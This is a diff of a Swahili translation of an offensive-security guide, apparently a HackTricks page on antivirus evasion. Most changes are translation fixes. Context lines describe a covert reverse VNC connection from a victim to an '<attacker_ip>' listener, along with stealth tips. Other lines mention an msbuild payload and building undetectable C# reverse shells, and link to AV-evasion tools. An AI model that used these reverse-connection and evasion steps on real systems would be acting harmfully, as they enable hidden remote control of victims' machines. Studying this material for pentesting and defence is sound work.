-Kisha, hamasisha binari _**winvnc.exe**_ na faili **mpya** iliyoundwa _**UltraVNC.ini**_ ndani ya **mhasiriwa**
+Kisha, hamasisha binary _**winvnc.exe**_ na faili **mpya** iliyoundwa _**UltraVNC.ini**_ ndani ya **mhasiriwa**
 
 #### **Muunganisho wa kurudi**
 
-**Mshambuliaji** anapaswa **kutekeleza ndani** ya **host** yake binari `vncviewer.exe -listen 5900` ili iwe **tayari** kukamata **muunganisho wa VNC** wa kurudi. Kisha, ndani ya **mhasiriwa**: Anza daemon ya winvnc `winvnc.exe -run` na endesha `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
+**Mshambuliaji** anapaswa **kutekeleza ndani** ya **host** yake binary `vncviewer.exe -listen 5900` ili iwe **tayari** kukamata **muunganisho wa VNC** wa kurudi. Kisha, ndani ya **mhasiriwa**: Anza daemon ya winvnc `winvnc.exe -run` na endesha `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
 
-**ONYO:** Ili kudumisha usiri huwezi kufanya mambo machache
+**ONYESHO:** Ili kudumisha usiri huwezi kufanya mambo machache
 
 * Usianze `winvnc` ikiwa tayari inaendesha au utaanzisha [popup](https://i.imgur.com/1SROTTl.png). angalia ikiwa inaendesha kwa `tasklist | findstr winvnc`
 * Usianze `winvnc` bila `UltraVNC.ini` katika saraka sawa au itasababisha [dirisha la usanidi](https://i.imgur.com/rfMQWcf.png) kufunguka
@@ -416,11 +416,11 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
 **Mlinzi wa sasa atamaliza mchakato haraka sana.**
 
-### Kuunda shell yetu ya kurudi
+### Kuunda shell yetu ya nyuma
 
 https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
 
-#### Shell ya Kwanza ya C#
+#### Revershell ya Kwanza ya C#
 
 Ili kuunda, tumia:
 ```
@@ -569,9 +569,9 @@ https://github.com/praetorian-code/vulcan
 
 * [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Ikiwa unavutiwa na **hacking career** na kuhack yasiyoweza kuhackwa - **tunatafuta wafanyakazi!** (_kuandika na kuzungumza kwa ufasaha kwa Kipolandi kunahitajika_).
+Ikiwa unavutiwa na **hacking career** na kujaribu kuvunja yasiyovunjika - **tunatafuta wafanyakazi!** (_kuandika na kuzungumza kwa ufasaha kwa Kipolishi kunahitajika_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
